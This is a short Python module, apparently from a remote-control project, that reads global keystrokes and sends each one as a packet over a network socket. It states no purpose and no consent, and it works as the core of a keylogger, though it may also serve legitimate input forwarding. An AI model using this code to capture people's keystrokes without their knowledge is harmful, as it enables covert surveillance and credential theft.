import keyboard

from modoules.protocol.protocol import Packet, PacketType, SendPacket


class KeyboardControl:

    @staticmethod
    def record():
        event = str(keyboard.read_event())
        event = event.removeprefix(r'KeyboardEvent(')
        event = event.removesuffix(')')
        return event

    @staticmethod
    def transmit(sock):
        keystroke = KeyboardControl.record()
        packet = Packet(PacketType.KEYBOARD, keystroke.encode())
        SendPacket.send_packet(sock, packet)